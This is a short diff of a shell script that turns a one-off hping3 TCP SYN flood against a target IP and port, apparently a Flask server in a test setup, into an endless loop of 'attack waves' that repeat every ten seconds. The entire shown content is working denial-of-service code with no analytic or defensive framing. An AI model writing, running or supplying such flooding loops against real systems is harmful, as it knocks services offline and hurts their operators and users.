@@ -51,6 +51,17 @@ fi
 
 echo "Using interval (microseconds): $interval_us"
 
-# Send TCP SYN packets to the Flask server
-exec hping3 --syn -p "$TARGET_PORT" -c "$PACKET_COUNT" -i u"$interval_us" "$TARGET_IP"
+# Run attack in loop - keep attacking continuously
+while true; do
+    echo "==================================="
+    echo "Starting attack wave at $(date)"
+    echo "==================================="
+    
+    # Send TCP SYN packets to the Flask server
+    hping3 --syn -p "$TARGET_PORT" -c "$PACKET_COUNT" -i u"$interval_us" "$TARGET_IP"
+    
+    echo ""
+    echo "Attack wave completed. Waiting 10 seconds before next wave..."
+    sleep 10
+done
 
